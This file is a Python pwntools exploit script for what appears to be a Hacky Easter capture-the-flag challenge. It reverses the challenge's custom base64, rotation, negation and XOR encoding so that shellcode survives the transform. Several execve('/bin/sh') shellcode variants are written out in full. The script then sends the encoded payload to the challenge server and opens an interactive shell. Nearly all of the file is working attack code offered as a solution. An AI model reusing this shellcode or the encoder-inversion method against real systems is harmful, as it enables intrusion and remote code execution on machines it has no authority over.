from re import I
from struct import pack, unpack
import array
import base64
from pwn import *

code_array = b'\x4b\x8f\x4f\x2a\x26\x3d\x3c\xac\x88\xa2\x6e\x5a\xe1\x25\x7f\x84\xb3\x26\x46\x3b\x7b\x4e\xa5\x5d\x05\xf2\x1a\xf1\x76\xc4\xcb\x46\x9a\xd6\x36\x36\xfe\x17\x1c\x53\xae\x24\x4b\x62\xe9\xb0\x33\x5a\x6b\x40\x3e\xb1\xc1\xb6\xc5\xbb\xe5\x97\x8e\x11\x37\x7e\x61\xbf\x9d\xb9\x30\x03\x83\xc1\xce\x37\xe1\xba\xea\x8b\x70\x73\x6b\xed\x7f\x07\xd2\xdc\x48\x58\x77\xf8\x9b\xe6\xec\xa1\x9c\x97\xdf\xd3\xd3\xaa\xab\x7c\x7f\x03\x09\x44\x17\xe1\x0f\xa3\xa8\xfb\x80\x71\x45\x51\xe4\xdb\x54\xbb\x46\x64\xc2\xbe\x36\x6a\x72\x17\x05\xee\xdb\x52\x71\xab\x6e\x98\x11\xc4\x8f\x32\x24\x58\x2b\x9c\x4f\x07\xb3\x80\x94\x86\x48\xe2\x93\x96\x2e\xae\xbd\x5b\xc7\xcb\x77\x13\x45\x28\xcb\xd4\xca\x96\xdc\x2b\x83\x45\x3c\x3a\x6c\x7f\xed\x8f\x06\x8e\xd9\x54\xd9\x6b\x4d\x7d\x2d\x38\xaf\x9b\x13\xa6\xed\x26\x1d\x5a\x43\xb2\x40\xab\x0e\xe4\xac\xf3\x67\xea\x6b\x90\x66\xcd\x8b\x5e\x62\x47\x7e\xe0\xe5\x0b\x4d\xa1\x89\xd2\x83\x24\xfd\x8b\xbf\xaa\xc0\xe9\xf4\x36\xf9\xc6\x18\x18\x2c\x09\x1e\xc4\x96\x0f\xb1\xdf\xa1\x00\xdd\x7e\x94\x61\x85\x41\xe7\xb0\x82\x7a\x7a\x17\x72\xc8\xd2\xe0\xfa\xe1\x28\x8e\xd3\xe5\x13\x1e\xbe\x7f\x10\x2b\xdc\x21\x29\xe3\x7e\x14\x47\xf7\x08\x0e\x93\x08\x4c\xea\x65\x2f\xa8\x06\xdd\xc6\x39\x1b\x2d\xe2\xcb\x86\xe5\x72\x94\xad\x7d\x9f\x80\xec\x5a\x74\xd9\xcf\x58\x85\xa9\xae\x99\xbc\x65\x16\xe7\xdd\x0d\x3d\xae\x98\x86\xa2\xad\x49\x57\x4e\x05\x82\xa4\x76\x4c\xc0\x8e\xbe\xc0\x03\x57\x23\x9c\x2f\xf8\x17\xb0\x98\x80\x7b\xc7\x86\x97\x3c\x14\x23\xb7\x2b\x46\x77\x6e\xfc\xdc\xef\xbe\x98\xec\xa6\xa3\x91\xe6\x83\x1c\xd5\xf5\xfc\xbf\x75\x95\xec\x88\x9f\x34\xf5\xd9\x96\x1d\x3f\xd3\xa6\x4d\x67\xd8\xc2\xd0\x4a\x0d\x7e\x3b\x01\x81\xda\x01\xbc\x5c\x2e\x45\xe3\x17\xca\xc8\x01\xaf\xb7\x6e\x6d\x61\x4d\x2a\xc0\x20\x36\x34\x52\x70\xe3\x7f\xfc\x6a\x8b\x8b\xf8\x25\xf2\x08\x1f\x96\xb6\xcb\xe8\xd8\xfc\x5b\xb0\x84\x93\xa0\xf2\xbb\x55\x06\x17\x14\x93\x3e\x55\xad\x35\xcf\x74\x7c\xf5\xe3\x60\xee\x92\xdd\xc9\xfa\xbf\xb1\x01\x5f\xe0\x9d\xca\x19\xb6\x56\x24\xdf\x4e\xef\x96\xfb\xd3\x96\xe8\x17\xfc\x66\xc1\x30\xcf\x5b\x6b\x40\xaf\xc0\x6a\x94\x6d\x3c\x2f\x5c\x93\xcb\xea\xdd\x19\x9b\xb4\x7c\x1b\x39\x37\xb8\xd6\xa1\x31\x8f\x21\x16\x21\x50\xd0\x04\x76\x20\x5d\xe8\xc5\x79\x58\xf4\x7b\x8e\xbb\xc9\x0f\x68\xe2\x78\x22\x61\xab\x89\x74\x91\x16\x42\xa3\x32\xe2\x78\xf8\x53\x22\x5a\xad\x06\x75\x2f\xac\x1d\xaf\x52\xf5\x3a\xf3\x7f\xdd\x8b\x84\xa8\xe1\x1a\x9c\xb3\x0c\x0e\x15\x5c\xe9\xb9\xdd\xf9\x2e\xfe\xd9\x09\x41\xce\x66\x42\xe9\x05\x91\x7a\x84\x53\x6d\xed\x7a\xe3\x0c\x19\x84\x5b\x71\xbc\xac\xf5\x3b\x8f\x01\xe0\xb6\x8e\x76\x0a\x2d\x0f\xa9\xff\x20\xb9\xe3\xaf\x66\x9d\x8d\x74\x29\xbf\x39\xe4\x5f\xa0\x54\x3b\xea\x5c\x9d\xef\xb8\xe9\x7c\xe8\x6c\x8d\xe1\xde\x3b\xc7\x24\x8a\x3d\xf0\x23\x02\x8d\xe8\x89\xbb\x4b\xc3\xc2\xe9\x53\x55\x38\xf6\x09\x3c\x04\x33\xe3\xf3\x00\xe4\xf1\x7f\x89\x1d\x79\x4a\x63\x75\xe5\xb7\x44\xdd\xb5\x60\x3a\xc4\x61\x8b\x7a\xfc\xd9\x16\xdf\xd7\xcc\xec\x9d\x82\xd8\x23\x5b\xbc\xd8\x77\xc8\x31\xc1\x97\x6e\xd7\xdf\x78\x7e\x63\x92\xba\x37\x74\x51\x2b\x53\x38\x85\xd0\x15\xef\x0b\x10\x46\x33\x1a\x35\xc5\x5a\xea\x16\x0c\x01\xe6\x02\xfc\xd3\x95\xf9\xd8\xf4\x5c\x29\x93\x09\xd4\x8f\x3f\x2f\x37\xa9\x50\xb5\x21\xc2\xcf\xb7\x6d\xc2\x08\x45\x2a\xda\xc1\x23\xe5\x73\x28\xb3\xbb\xf9\x11\x7e\x27\xf0\xa2\xe4\x61\x99\x5d\x37\xd9\x9f\xd8\x9f\x57\x54\x57\xe4\x1f\xab\x10\x66\xbc\xf9\xf5\x2a\xb6\xc8\x0c\xce\x11\x23\x9b\xf9\x79\x0a\x61\xdf\x86\x69\xbb\xcc\xdb\x3a\x1e\x3d\xb8\x34\x01\x7e\x6a\x8f\x2a\x5b\x5a\xe6\xa8\xaa\xc7\xfb\xf8\x4f\xfd\x20\xfa\x58\x59\xeb\x79\x68\x52\x01\x3b\x6e\x87\x8f\x0d\xb4\x42\x07\xbf\x65\xc9\x3b\x50\xdf\xb8\x3b\xe7\xe5\xa8\x57\xac\xbd\xa0\x9d\xc7\xf9\x25\x55\x93\xa9\x75\x0e\xee\xf2\x21\x0a\x3a\x05\x38\xd8\xeb\xbe\xba\x11\x7a\x26\x8b\xfc\xb0\x9f\x8f\x15\xe5\xe9\x0f\x38\xef\x6c\xc1\xe6\x07\x54\x96\x26\xed\x51\xb1\x1f\xea\x16\xd1\x45\xc0\x30\xa4\x70\xf7\xa0\x20\x78\x50\x23\xda\x19\xb8\xa6\xfc\xf1\xff\x4f\x8d\x2b\x02\x74\xbf\xdb\xf1\xf4\x8f\x91\x29\x3b\xf5\xbc\x54\xbf\xf2\x00\x66\x6a\x10\xf7\xb7\x57\x89\x43\x9f\xbf\x51\x1f\xb9\xeb\xce\x86\x82\x4e\xc5\xf8\x74\x6a\x30\x99\xc4\x76\xd2\xdd\x27\x99\x67\x7f\x85\x78\xbd\x9a\x12\x34\xbb\xc9\xd3'

base_init_arr = b'/rzDNfGHIJKL8EOP5eSTUVtX4ZabcdRFghijklmnopqBsWuvwxyC0321YQ76M9+A'
code_array =b'\x4b\x8f\x4f\x2a\x26\x3d\x3c\xac\x88\xa2\x6e\x5a\xe1\x25\x7f\x84\xb3\x26\x46\x3b\x7b\x4e\xa5\x5d\x05\xf2\x1a\xf1\x76\xc4\xcb\x46\x9a\xd6\x36\x36\xfe\x17\x1c\x53\xae\x24\x4b\x62\xe9\xb0\x33\x5a\x6b\x40\x3e\xb1\xc1\xb6\xc5\xbb\xe5\x97\x8e\x11\x37\x7e\x61\xbf\x9d\xb9\x30\x03\x83\xc1\xce\x37\xe1\xba\xea\x8b\x70\x73\x6b\xed\x7f\x07\xd2\xdc\x48\x58\x77\xf8\x9b\xe6\xec\xa1\x9c\x97\xdf\xd3\xd3\xaa\xab\x7c\x7f\x03\x09\x44\x17\xe1\x0f\xa3\xa8\xfb\x80\x71\x45\x51\xe4\xdb\x54\xbb\x46\x64\xc2\xbe\x36\x6a\x72\x17\x05\xee\xdb\x52\x71\xab\x6e\x98\x11\xc4\x8f\x32\x24\x58\x2b\x9c\x4f\x07\xb3\x80\x94\x86\x48\xe2\x93\x96\x2e\xae\xbd\x5b\xc7\xcb\x77\x13\x45\x28\xcb\xd4\xca\x96\xdc\x2b\x83\x45\x3c\x3a\x6c\x7f\xed\x8f\x06\x8e\xd9\x54\xd9\x6b\x4d\x7d\x2d\x38\xaf\x9b\x13\xa6\xed\x26\x1d\x5a\x43\xb2\x40\xab\x0e\xe4\xac\xf3\x67\xea\x6b\x90\x66\xcd\x8b\x5e\x62\x47\x7e\xe0\xe5\x0b\x4d\xa1\x89\xd2\x83\x24\xfd\x8b\xbf\xaa\xc0\xe9\xf4\x36\xf9\xc6\x18\x18\x2c\x09\x1e\xc4\x96\x0f\xb1\xdf\xa1\x00\xdd\x7e\x94\x61\x85\x41\xe7\xb0\x82\x7a\x7a\x17\x72\xc8\xd2\xe0\xfa\xe1\x28\x8e\xd3\xe5\x13\x1e\xbe\x7f\x10\x2b\xdc\x21\x29\xe3\x7e\x14\x47\xf7\x08\x0e\x93\x08\x4c\xea\x65\x2f\xa8\x06\xdd\xc6\x39\x1b\x2d\xe2\xcb\x86\xe5\x72\x94\xad\x7d\x9f\x80\xec\x5a\x74\xd9\xcf\x58\x85\xa9\xae\x99\xbc\x65\x16\xe7\xdd\x0d\x3d\xae\x98\x86\xa2\xad\x49\x57\x4e\x05\x82\xa4\x76\x4c\xc0\x8e\xbe\xc0\x03\x57\x23\x9c\x2f\xf8\x17\xb0\x98\x80\x7b\xc7\x86\x97\x3c\x14\x23\xb7\x2b\x46\x77\x6e\xfc\xdc\xef\xbe\x98\xec\xa6\xa3\x91\xe6\x83\x1c\xd5\xf5\xfc\xbf\x75\x95\xec\x88\x9f\x34\xf5\xd9\x96\x1d\x3f\xd3\xa6\x4d\x67\xd8\xc2\xd0\x4a\x0d\x7e\x3b\x01\x81\xda\x01\xbc\x5c\x2e\x45\xe3\x17\xca\xc8\x01\xaf\xb7\x6e\x6d\x61\x4d\x2a\xc0\x20\x36\x34\x52\x70\xe3\x7f\xfc\x6a\x8b\x8b\xf8\x25\xf2\x08\x1f\x96\xb6\xcb\xe8\xd8\xfc\x5b\xb0\x84\x93\xa0\xf2\xbb\x55\x06\x17\x14\x93\x3e\x55\xad\x35\xcf\x74\x7c\xf5\xe3\x60\xee\x92\xdd\xc9\xfa\xbf\xb1\x01\x5f\xe0\x9d\xca\x19\xb6\x56\x24\xdf\x4e\xef\x96\xfb\xd3\x96\xe8\x17\xfc\x66\xc1\x30\xcf\x5b\x6b\x40\xaf\xc0\x6a\x94\x6d\x3c\x2f\x5c\x93\xcb\xea\xdd\x19\x9b\xb4\x7c\x1b\x39\x37\xb8\xd6\xa1\x31\x8f\x21\x16\x21\x50\xd0\x04\x76\x20\x5d\xe8\xc5\x79\x58\xf4\x7b\x8e\xbb\xc9\x0f\x68\xe2\x78\x22\x61\xab\x89\x74\x91\x16\x42\xa3\x32\xe2\x78\xf8\x53\x22\x5a\xad\x06\x75\x2f\xac\x1d\xaf\x52\xf5\x3a\xf3\x7f\xdd\x8b\x84\xa8\xe1\x1a\x9c\xb3\x0c\x0e\x15\x5c\xe9\xb9\xdd\xf9\x2e\xfe\xd9\x09\x41\xce\x66\x42\xe9\x05\x91\x7a\x84\x53\x6d\xed\x7a\xe3\x0c\x19\x84\x5b\x71\xbc\xac\xf5\x3b\x8f\x01\xe0\xb6\x8e\x76\x0a\x2d\x0f\xa9\xff\x20\xb9\xe3\xaf\x66\x9d\x8d\x74\x29\xbf\x39\xe4\x5f\xa0\x54\x3b\xea\x5c\x9d\xef\xb8\xe9\x7c\xe8\x6c\x8d\xe1\xde\x3b\xc7\x24\x8a\x3d\xf0\x23\x02\x8d\xe8\x89\xbb\x4b\xc3\xc2\xe9\x53\x55\x38\xf6\x09\x3c\x04\x33\xe3\xf3\x00\xe4\xf1\x7f\x89\x1d\x79\x4a\x63\x75\xe5\xb7\x44\xdd\xb5\x60\x3a\xc4\x61\x8b\x7a\xfc\xd9\x16\xdf\xd7\xcc\xec\x9d\x82\xd8\x23\x5b\xbc\xd8\x77\xc8\x31\xc1\x97\x6e\xd7\xdf\x78\x7e\x63\x92\xba\x37\x74\x51\x2b\x53\x38\x85\xd0\x15\xef\x0b\x10\x46\x33\x1a\x35\xc5\x5a\xea\x16\x0c\x01\xe6\x02\xfc\xd3\x95\xf9\xd8\xf4\x5c\x29\x93\x09\xd4\x8f\x3f\x2f\x37\xa9\x50\xb5\x21\xc2\xcf\xb7\x6d\xc2\x08\x45\x2a\xda\xc1\x23\xe5\x73\x28\xb3\xbb\xf9\x11\x7e\x27\xf0\xa2\xe4\x61\x99\x5d\x37\xd9\x9f\xd8\x9f\x57\x54\x57\xe4\x1f\xab\x10\x66\xbc\xf9\xf5\x2a\xb6\xc8\x0c\xce\x11\x23\x9b\xf9\x79\x0a\x61\xdf\x86\x69\xbb\xcc\xdb\x3a\x1e\x3d\xb8\x34\x01\x7e\x6a\x8f\x2a\x5b\x5a\xe6\xa8\xaa\xc7\xfb\xf8\x4f\xfd\x20\xfa\x58\x59\xeb\x79\x68\x52\x01\x3b\x6e\x87\x8f\x0d\xb4\x42\x07\xbf\x65\xc9\x3b\x50\xdf\xb8\x3b\xe7\xe5\xa8\x57\xac\xbd\xa0\x9d\xc7\xf9\x25\x55\x93\xa9\x75\x0e\xee\xf2\x21\x0a\x3a\x05\x38\xd8\xeb\xbe\xba\x11\x7a\x26\x8b\xfc\xb0\x9f\x8f\x15\xe5\xe9\x0f\x38\xef\x6c\xc1\xe6\x07\x54\x96\x26\xed\x51\xb1\x1f\xea\x16\xd1\x45\xc0\x30\xa4\x70\xf7\xa0\x20\x78\x50\x23\xda\x19\xb8\xa6\xfc\xf1\xff\x4f\x8d\x2b\x02\x74\xbf\xdb\xf1\xf4\x8f\x91\x29\x3b\xf5\xbc\x54\xbf\xf2\x00\x66\x6a\x10\xf7\xb7\x57\x89\x43\x9f\xbf\x51\x1f\xb9\xeb\xce\x86\x82\x4e\xc5\xf8\x74\x6a\x30\x99\xc4\x76\xd2\xdd\x27\x99\x67\x7f\x85\x78\xbd\x9a\x12\x34\xbb\xc9\xd3' 
base_dict = {}

def init_fields():
    for i in range(0x40):
        base_dict[base_init_arr[i]] = i

def pad(s):
    if len(s) % 3 == 0:
        return s
    p = 3 - (len(s) %3)
    return s + array.array('B', p*b'\x00')


def encode(s):
    ret = b''
    toPad = 3 - len(s) % 3 if len(s) % 3 !=0 else 0

    s = pad(s)
    for i in range(0,len(s),3):
        tmp = struct.pack('BBBB', s[i+2], s[i+1], s[i], 0)
        tmp = struct.unpack('I', tmp)[0]
        rTmp = b''
        for _ in range(4):
            tmp1 = (tmp & 0x3F)
            tmp2 = chr(base_init_arr[tmp1] & 0xFF).encode('ascii')
            rTmp += tmp2 
            tmp >>= 6
        rTmp = rTmp[::-1]
        ret += rTmp
    if toPad > 0:
        ret = ret[:-toPad] + toPad*b'='
    return array.array('B', ret)

    
def decode(b):
    ret = b''
    for i in range(0,len(b),4):
        # tmp = 0
        nEq = 0
        # tmp = 0x40000* b[i] + 0x1000 * b[i+1] + 0x40 * b[i+2] + b[i+3]
        tmp2 = 0
        for j in range(4):
            tmp2 *= 0x40
            if b[i+j] != ord('='):
                tmp2 += base_dict[b[i+j]] if b[i+j] in base_dict else 0
            else:
                nEq += 1
        #     print(f'b[i] = {b[i+j]:x} --> {tmp2:x}')
        # print(f'{tmp2:08x} {b[i]:x} {b[i+1]:x} {b[i+2]:x} {b[i+3]:x}')
        # print(b.tobytes(), nEq)
        ret += bytes([(tmp2 >> 0x10) & 0xFF])
        if nEq < 2:
            ret += bytes([(tmp2 >> 0x8) & 0xFF])
        if nEq < 1:
            ret += bytes([tmp2 & 0xFF])
    # print(ret)
    return array.array('B', ret)


def neg(b):
    for i in range(len(b)):
        b[i] = (~b[i] & 0xFF)


def ror(b, shift):
    for i in range(0, len(b) - 4, 4):
        # print(b[i:i+4].tobytes())
        val = struct.unpack('I', b[i:i+4].tobytes())[0]
        # print(val)
        bVar2 = ((~-shift ^ 0x1f) & 0x1f)
        # print(shift, bVar2)
        uVar2 = val << shift
        uVar3 = val >> bVar2
        val_new = (2**32-1) & (uVar2 | uVar3)
        # print(f'{val_new:x}, {val_new:b}, {val:x}, {val:b}')
        b_new = struct.pack('I', val_new)
        # print(b_new)
        for j in range(4):
            b[i+j] = b_new[j]


def rol(b, shift):
    ror(b, 32 - shift)


def ror_base64(b, shift):
    for i in range(0, len(b), 4):
        # print(b[i:i+4].tobytes())
        val = struct.unpack('I', b[i:i+4].tobytes())[0]
        # print(val)
        bVar2 = ((~-shift ^ 0x1f) & 0x1f)
        # print(shift, bVar2)
        uVar2 = val << shift
        uVar3 = val >> bVar2
        val_new = (2**32-1) & (uVar2 | uVar3)
        # print(f'{val_new:x}, {val_new:b}, {val:x}, {val:b}')
        b_new = struct.pack('I', val_new)
        # print(b_new)
        for j in range(4):
            b[i+j] = b_new[j]


def rol_base64(b, shift):
    ror_base64(b, 32 - shift)


def add(b, v):
    for i in range(len(b)):
        b[i] += v


def hex_print(b):
    for i in range(len(b)):
        print(f'{b[i]:02x} ', end='')
    print()

    
def xor_code(b):
    step = len(b.tobytes())
    for i in range(len(b)):
        j = b[i];
        tmp = (i*step)%0x3f0 
        c = code_array[(i * step) % 0x3f0]
        # c = code_array[(i * step) % 0x3f0]
        # print(f'{tmp}: {c:x}')
        tmp1 = ~c & j
        tmp2 = ~j & c
        # print(f'{i}, {j:x}: {c:x} --> {j ^ c:x} --> {tmp1 | tmp2:x}')
        b[i] = tmp1 | tmp2


def test(b):
    print(b.tobytes())
    hex_print(b)
    add(b, -0xd)
    hex_print(b)
    ror_base64(b, 0x15)
    hex_print(b)
    print(b.tobytes())    
    bin_data = decode(b)
    print('after decoding')
    hex_print(bin_data)
    ror(bin_data, 0x19)
    hex_print(bin_data)
    neg(bin_data)
    hex_print(bin_data)
    xor_code(bin_data)
    hex_print(bin_data)
    return bin_data


def reverse(b):
    hex_print(b)
    xor_code(b)
    hex_print(b)
    neg(b)
    # hex_print(b)
    rol(b, 0x19)
    hex_print(b)
    user_input = encode(b)
    # user_input[-1] = ord(b'=')
    # user_input[-2] = ord(b'=')
    print(user_input.tobytes())
    rol_base64(user_input, 0x15)
    hex_print(user_input)
    # print(user_input.tobytes())
    add(user_input, 0xd)
    hex_print(user_input)
    # print('input:')
    # print(user_input.tobytes())
    return user_input


def test_base64():
    for b1 in range(256):
        b = array.array('B', [b1])
        s = encode(b)
        b_new = decode(s)
        print(b, b_new, s, s.tobytes())
        assert(b == b_new)
        for b2 in range(256):
            b = array.array('B', [b1, b2])
            s = encode(b)
            b_new = decode(s)
            assert(b == b_new)
            for b3 in range(256):
                b = array.array('B', [b1, b2, b3])
                s = encode(b)
                b_new = decode(s)
                assert(b == b_new)

def test_roundtrip():
    for i in range(12):
        shellcode = i*b'\xc3'
        shellcode = i*b'\xa5'
        b1 = reverse(array.array('B', shellcode))
        # print(b)
        print(b1.tobytes())
        # assert(b1 == b)
        b2 = test(array.array('B', b1.tobytes()))
        print(shellcode, len(shellcode))
        print(b1.tobytes(), len(b1))
        print(b2.tobytes(), len(b2))
        assert(shellcode == b2.tobytes())


def test_code_array():
    for i in range(len(code_array)):
        if code_array[i] != ca2[i]:
            print(f'difference at index {i}: {code_array[i]:02x}, {ca2[i]:02x}')
            print(f'neighbours {i-1}: {code_array[i-1]:02x}, {ca2[i-1]:02x}')
            print(f'neighbours {i+1}: {code_array[i+1]:02x}, {ca2[i+1]:02x}')
            exit(-1)


if __name__ == '__main__':
    init_fields()
    # test_base64()
    # b = b'he2023{asdfasdfasdfsssdfasd}'
    # print(b)
    # bin_data = test(array.array('B',b))
    # test_roundtrip()    

    # user_input = array.array('B',b'8EOP5eSTU5==')
    # rol_base64(user_input, 0x15)
    # # print(user_input.tobytes())
    # add(user_input, 0xd)
    # hex_print(user_input) 
    # t1 = test(array.array('B', user_input.tobytes()))
    # print(t1.tobytes())
    # t2 = reverse(array.array('B', t1.tobytes()))
    # print(t2.tobytes())

# const char shellcode[] =
#         "\x31\xc0\x50\x48\x8b\x14\x24\xeb\x10\x54"
#         "\x78\x06\x5e\x5f\xb0\x3b\x0f\x05\x59\x5b"
#         "\x40\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff"
#         "/bin/sh";

    # test_code_array()
    t = test(array.array('B', b"\x18\x800\xbf\xa8\x0f\x96\x17\x88\xbewg"))
    hex_print(t)

    shellcode = b'\xc3\x90\x90\x90\x90\x90\x90'
    shellcode = b'\xc3\x90\x90\x90\x90\x90'
    shellcode = b'\xc3\x90\x90\x90\x90'
    shellcode = b'\xc3\x90\x90\x90'
    shellcode = b'\xc3\x90\x90' # does fail because input is too short
    shellcode = b'\xc3\x90\x90\x90\x90\x90\x90\x90'
    shellcode = b'\xc3\x90\x90\x90\x90\x90\x90\x90\x90'

    shellcode = b"\x31\xc0\x50\x48\x8b\x14\x24\xeb\x10\x54" + \
        b"\x78\x06\x5e\x5f\xb0\x3b\x0f\x05\x59\x5b" + \
        b"\x40\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff" + \
        b"/bin/sh"
    shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
    shellcode = b"\x31\xf6"                     + \
                b"\xf7\xe6"                     + \
                b"\x52"                         + \
                b"\x52"                         + \
                b"\x52"                         + \
                b"\x54"                         + \
                b"\x5b"                         + \
                b"\x53"                         + \
                b"\x5f"                         + \
                b"\xc7\x07\x2f\x62\x69\x6e"     + \
                b"\xc7\x47\x04\x2f\x2f\x73\x68" + \
                b"\x40\x75\x04"                 + \
                b"\xb0\x3b"                     + \
                b"\x0f\x05"                     + \
                b"\x31\xc9"                     + \
                b"\xb0\x0b"                     + \
                b"\xcd\x80"                     + \
                b'\x90\x90\x90\x90\x90\x90\x90\x90'
    print(len(shellcode), shellcode)
    input = reverse(array.array('B', shellcode))
    hex_print(input)
    print(input.tobytes())
    res = test(input)
    hex_print(res)
    conn = remote('ch.hackyeaster.com', 2309)
    conn.recvuntil(b'=\n')
    conn.send(input.tobytes())
    conn.interactive()